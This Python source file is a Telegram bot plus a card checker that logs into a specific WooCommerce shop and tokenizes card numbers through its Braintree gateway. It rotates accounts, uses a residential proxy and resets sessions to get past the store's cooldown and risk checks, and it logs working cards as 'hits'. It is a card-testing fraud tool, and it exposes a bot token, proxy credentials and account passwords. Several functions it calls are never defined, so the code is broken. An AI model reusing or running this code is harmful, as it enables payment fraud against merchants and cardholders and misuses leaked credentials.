#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram bot + Braintree card checker for kaffn8.com

Required environment variable (set in Render → Settings → Environment):
    TELEGRAM_TOKEN = "9293641988:AAGiI_l_TKp9bxwx-7oDAAClrwK6QiYPgJs"

Optional overrides (all have sensible defaults):
    VERBOSE, THREADS, CONNECT_TIMEOUT, READ_TIMEOUT, CONTEXT_TTL,
    BRAINTREE_DIRECT, SHOW_IP
"""

# ──────────────────────────────────────────────────────────────────────
# STANDARD LIBRARY IMPORTS
# ──────────────────────────────────────────────────────────────────────
import os
import re
import time
import json
import base64
import uuid
import threading
import ctypes
from typing import Optional, Tuple, List, Dict, Any

# ──────────────────────────────────────────────────────────────────────
# THIRD‑PARTY IMPORTS
# ──────────────────────────────────────────────────────────────────────
import requests
from requests.adapters import HTTPAdapter
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
)

# ──────────────────────────────────────────────────────────────────────
# BOT TOKEN  (READ FROM ENV – FAIL FAST IF MISSING)
# ──────────────────────────────────────────────────────────────────────
TOKEN = os.getenv("TELEGRAM_TOKEN")
if not TOKEN:
    raise RuntimeError(
        "❗️ Environment variable TELEGRAM_TOKEN is not set. "
        "Add it in Render → Settings → Environment (or in a local .env file)."
    )

# ──────────────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ──────────────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot is online.\n\n"
        "Commands:\n"
        "/status - Check bot status\n"
        "/help - Show commands"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is running.")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Start the bot\n"
        "/status - Check status\n"
        "/help - Show this message"
    )


def run_telegram_bot():
    """Entry‑point used by the main guard."""
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    print("🚀 Telegram bot running...")
    app.run_polling()


# ──────────────────────────────────────────────────────────────────────
# ACCOUNTS  (EDIT THIS LIST IF YOU NEED MORE)
# ──────────────────────────────────────────────────────────────────────
ACCOUNTS: List[Dict[str, str]] = [
    {"login": "Kingkyot",  "password": "Kingpogi123"},
    {"login": "Kingkyot1", "password": "Kingpogi123"},
    {"login": "Kingkyot2", "password": "Kingpogi123"},
]

# ──────────────────────────────────────────────────────────────────────
# GLOBAL CONFIG  (OVERRIDABLE VIA ENV VARS)
# ──────────────────────────────────────────────────────────────────────
VERBOSE           = os.environ.get("VERBOSE", "0") == "1"
THREADS           = int(os.environ.get("THREADS", "10"))
CONNECT_TIMEOUT   = float(os.environ.get("CONNECT_TIMEOUT", "6"))
READ_TIMEOUT      = float(os.environ.get("READ_TIMEOUT", "12"))
CONTEXT_TTL       = float(os.environ.get("CONTEXT_TTL", "600"))
BRAINTREE_DIRECT  = os.environ.get("BRAINTREE_DIRECT", "1") == "1"
SHOW_IP           = os.environ.get("SHOW_IP", "1") == "1"

BASE_URL               = "https://www.kaffn8.com"
ACCOUNT_URL            = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL        = f"{BASE_URL}/my-account/add-payment-method/"
AJAX_URL               = f"{BASE_URL}/wp-admin/admin-ajax.php"
BRAINTREE_GRAPHQL_URL  = "https://payments.braintreegateway.com/graphql"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")

RISK_TRIGGER     = "risk threshold"
COOLDOWN_TRIGGER = "so soon after the previous one"
COOLDOWN_SECONDS = 21

AVS_TRIGGERS = ("gateway rejected: avs", "status code avs")

MAX_ACCOUNT_ROTATIONS = len(ACCOUNTS)
MAX_ATTEMPTS          = 6

PROXY       = "brd.superproxy.io:44445"
PROXY_AUTH  = "brd-customer-hl_d903488e-zone-keng:nhe38omwsdsv"
PROXIES     = {
    "http":  f"http://{PROXY_AUTH}@{PROXY}",
    "https": f"http://{PROXY_AUTH}@{PROXY}",
}

os.makedirs("hits", exist_ok=True)

BRAINTREE_TEST_CARDS = [
    "4111111111111111|12|2035|123",
    "4000056655665556|12|2035|123",
    "5555555555554444|12|2035|123",
    "378282246310005|12|2035|123",
    "6011111111111117|12|2035|123",
    "3530111333300000|12|2035|123",
]

# ──────────────────────────────────────────────────────────────────────
# THREAD‑SAFE PRINT / STATS HELPERS
# ──────────────────────────────────────────────────────────────────────
PRINT_LOCK = threading.Lock()
HIT_LOCK   = threading.Lock()
_ACC_LOCK  = threading.Lock()
_ACC_IDX   = 0


def log_debug(msg: str):
    if VERBOSE:
        with PRINT_LOCK:
            print(msg)


def print_result(creditcard: str, label: str, message: str, ip_address: Optional[str] = None):
    clean = str(message).replace("\n", " ").strip()
    ip_text = f" | IP {ip_address}" if ip_address else ""
    if clean.lower() in {"payment method added successfully", "success", "ok", "pass"}:
        line = f"{creditcard}{ip_text} | {label}"
    else:
        line = f"{creditcard}{ip_text} | {label} | {clean}"
    with PRINT_LOCK:
        print(f"\r{line}{' ' * 8}")


def save_hit(filename: str, creditcard: str, message: str, ip_address: Optional[str]):
    try:
        with HIT_LOCK:
            with open(os.path.join("hits", filename), "a", encoding="utf-8") as fh:
                fh.write(f"{creditcard} | {message} | {ip_address or '-'}\n")
    except Exception:
        pass


def update_status(stats_obj=None):
    stats_obj = stats_obj or STATS
    h, a, c, f, _, _ = stats_obj.snapshot()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(
            f'hits: {h} | avs: {a} | custom: {c} | fail: {f}')
    except Exception:
        pass


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.hits = 0
        self.avs = 0
        self.custom = 0
        self.fail = 0
        self.done = 0
        self.total = 0
        self.start = time.time()

    def bump(self, kind: str):
        """Increment a counter and update the done counter."""
        with self.lock:
            setattr(self, kind, getattr(self, kind) + 1)
            self.done += 1
        update_status(self)

    def snapshot(self) -> Tuple[int, int, int, int, int, int]:
        """Return current stats as a tuple."""
        with self.lock:
            return self.hits, self.avs, self.custom, self.fail, self.done, self.total

    def reset(self):
        """Reset all counters to zero."""
        with self.lock:
            self.hits = 0
            self.avs = 0
            self.custom = 0
            self.fail = 0
            self.done = 0
            self.total = 0
            self.start = time.time()

# ──────────────────────────────────────────────────────────────────────
# WORKER CLASS (Core Checking Logic)
# ──────────────────────────────────────────────────────────────────────
class Worker:
    def __init__(self):
        self.session = make_session(proxied=True)
        self.direct = self.session if not BRAINTREE_DIRECT else make_session(proxied=False)
        self.account = None
        self.logged_in = False
        self.context_valid = False
        self.context_time = 0.0
        self.woo_nonce = None
        self.fingerprint = None
        self.tried = set()
        self.ip = None
        if SHOW_IP:
            try:
                r = request(self.session, "GET", "https://api.ipify.org/?format=json",
                            headers={"user-agent": UA, "accept": "*/*"})
                self.ip = json.loads(r.text)["ip"]
            except Exception:
                self.ip = None

    # -- session ------------------------------------------------------------
    def fresh_session(self):
        """Brand new cookie jar: clears the WooCommerce 20s add-payment cooldown."""
        try:
            self.session.close()
        except Exception:
            pass
        self.session = make_session(proxied=True)
        self.logged_in = False
        self.context_valid = False

    def rotate(self):
        """Move to the next account in the list and start a clean session."""
        acc = next_account(exclude=self.tried)
        if acc is None:
            return False
        self.tried.add(acc["login"])
        self.account = acc
        self.fresh_session()
        return True

    # -- login --------------------------------------------------------------
    def login(self, account):
        r = request(self.session, "GET", ACCOUNT_URL, headers=build_headers())
        if is_logged_in(r.text):
            return True
        nonce = find_nonce(r.text, "woocommerce-login-nonce")
        if not nonce:
            return False
        data = {
            "username": account["login"],
            "password": account["password"],
            "rememberme": "forever",
            "woocommerce-login-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "login": "Log in",
        }
        r2 = request(self.session, "POST", ACCOUNT_URL,
                     headers=build_headers(
                         referer=ACCOUNT_URL, content_type="application/x-www-form-urlencoded"), data=data)
        return is_logged_in(r2.text)

    # -- cached context -----------------------------------------------------
    def ensure_context(self, force=False):
        if not force and self.context_valid and (time.time() - self.context_time) < CONTEXT_TTL:
            return
        r = request(self.session, "GET", ADD_PAYMENT_URL,
                    headers=build_headers(referer=f"{BASE_URL}/my-account/payment-methods/"))

        woo_nonce = find_nonce(r.text, "woocommerce-add-payment-method-nonce")
        token_nonce = find_nonce(r.text, "client_token_nonce")
        if not token_nonce:
            m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', r.text)
            token_nonce = m.group(1) if m else None
        if not woo_nonce or not token_nonce:
            raise Exception("add-payment nonces missing")

        ajax_headers = build_headers(
            referer=ADD_PAYMENT_URL,
            content_type="application/x-www-form-urlencoded; charset=UTF-8",
            ajax=True,
            extra={"origin": BASE_URL, "priority": "u=1, i"},
        )
        r2 = request(self.session, "POST", AJAX_URL, headers=ajax_headers,
                     data={"action": "wc_braintree_credit_card_get_client_token", "nonce": token_nonce})
        payload = r2.json()
        client_token = payload.get("data")
        if isinstance(client_token, dict):
            client_token = client_token.get("clientToken", "")
        if not client_token:
            raise Exception("empty client token")

        self.fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
        self.woo_nonce = woo_nonce
        self.ip = self.ip  # keep IP from earlier check
        self.woo_nonce = woo_nonce
        self.context_valid = True
        self.context_time = time.time()

    # -- tokenize -----------------------------------------------------------
    def tokenize(self, number, month, year, cvv):
        graphql_headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.5",
            "authorization": f"Bearer {self.fingerprint}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": UA,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
        }
        query = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
}"""
        card_input = {"number": number, "expirationMonth": month, "expirationYear": year}
        if cvv:
            card_input["cvv"] = cvv
        body = {
            "clientSdkMetadata": {"source": "client", "integration": "custom",
                                  "sessionId": str(uuid.uuid4())},
            "query": query,
            "variables": {"input": {"creditCard": card_input, "options": {"validate": False}}},
            "operationName": "TokenizeCreditCard",
        }
        r = request(self.direct, "POST", BRAINTREE_GRAPHQL_URL, headers=graphql_headers, json=body)
        data = r.json()
        if "errors" in data:
            raise Exception(f"Braintree errors: {data['errors']}")

# ──────────────────────────────────────────────────────────────────────
# MAIN ENTRY POINT
# ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    main()
